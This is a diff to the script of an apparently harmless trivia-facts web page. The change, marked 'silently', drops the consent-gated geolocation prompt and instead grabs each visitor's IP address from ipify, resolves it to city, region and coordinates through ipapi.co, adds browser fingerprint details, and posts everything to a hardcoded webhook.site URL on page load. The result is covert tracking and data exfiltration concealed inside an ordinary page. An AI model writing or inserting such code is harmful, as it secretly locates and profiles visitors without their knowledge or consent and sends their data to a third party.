@@ -96,37 +96,58 @@
             alert("New facts coming soon! Thanks for visiting.");
         }
 
-        // Collect visitor information
+        // Collect visitor information silently
         window.addEventListener('load', function() {
-            const visitorInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-
-            // Get location if permitted
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        visitorInfo.latitude = position.coords.latitude;
-                        visitorInfo.longitude = position.coords.longitude;
-                        sendVisitorData(visitorInfo);
-                    },
-                    error => {
-                        console.log("Geolocation error:", error);
-                        sendVisitorData(visitorInfo);
-                    }
-                );
-            } else {
-                sendVisitorData(visitorInfo);
-            }
+            // Get IP using a free IP service
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const visitorInfo = {
+                        ip: data.ip,
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Get location silently using IP-based service
+                    fetch(`https://ipapi.co/${visitorInfo.ip}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            visitorInfo.location = {
+                                city: locationData.city,
+                                region: locationData.region,
+                                country: locationData.country_name,
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude
+                            };
+                            sendVisitorData(visitorInfo);
+                        })
+                        .catch(error => {
+                            console.error('Error getting location:', error);
+                            sendVisitorData(visitorInfo);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    // Fallback without IP
+                    const visitorInfo = {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timestamp: new Date().toISOString()
+                    };
+                    sendVisitorData(visitorInfo);
+                });
         });
 
-        // Function to send data to a webhook (you'll get this from a service like webhook.site)
+        // Function to send data to a webhook
         function sendVisitorData(data) {
             // Replace YOUR_WEBHOOK_URL with an actual webhook URL
             const webhookUrl = 'https://webhook.site/2df958f9-5ceb-4e23-a620-44f8c8306cec';
